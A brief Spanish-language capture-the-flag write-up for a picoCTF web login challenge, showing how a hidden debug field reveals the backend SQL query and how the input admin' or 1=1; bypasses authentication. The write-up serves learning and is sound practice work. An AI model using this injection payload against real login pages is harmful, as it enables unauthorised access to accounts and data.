#notas_hacking #web
# Reto
## Descripción
There is a website running at `https://jupiter.challenges.picoctf.org/problem/50009/` ([link](https://jupiter.challenges.picoctf.org/problem/50009/)) or http://jupiter.challenges.picoctf.org:50009. Do you think you can log us in? Try to see if you can login!
## Solución
esta un campo oculto que al poner el valor como 1 
```html
<input type="hidden" name="debug" value="1">
```
te muestra datos que se usaban de `debugin`
```sql
username: admin
password: admin
SQL query: SELECT * FROM users WHERE name='admin' AND password='admin'
```
al ser una consulta donde solo se concatenan los valores ingresados es vulnerable a una inyección SQL
si ingresamos `admin' or 1=1;` remanaría viéndose algo como:
```sql
SQL query: SELECT * FROM users WHERE name='admin' or 1=1;' AND password='admin'
```
entonces 1=1 siempre es verdadero e ignora lo demás
## Notas
`SQL injection` -  Es la colocación de código malicioso en sentencias SQL, a través de la entrada de una página web.
## Referencias
https://www.w3schools.com/sql/sql_injection.asp